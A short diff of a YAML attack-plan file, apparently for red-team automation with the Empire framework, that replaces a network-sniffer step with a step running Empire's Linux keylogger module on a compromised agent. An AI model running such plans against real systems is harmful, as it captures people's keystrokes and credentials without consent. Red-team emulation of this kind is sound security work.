@@ -44,12 +44,9 @@ plan:
       next:
         - type: result
           value: OK
-          step: sniffer-on-agent
-    - name: sniffer-on-agent
+          step: keylogger-on-agent
+    - name: keylogger-on-agent
       step_type: empire/execute-on-agent
       arguments:
         use_agent: MyAgent
-        empire_module: collection/sniffer
-        empire_module_args: # Optional
-          IpFilter: 192.168.33.12
-          PortFilter: 1234
+        empire_module: python/collection/linux/xkeylogger
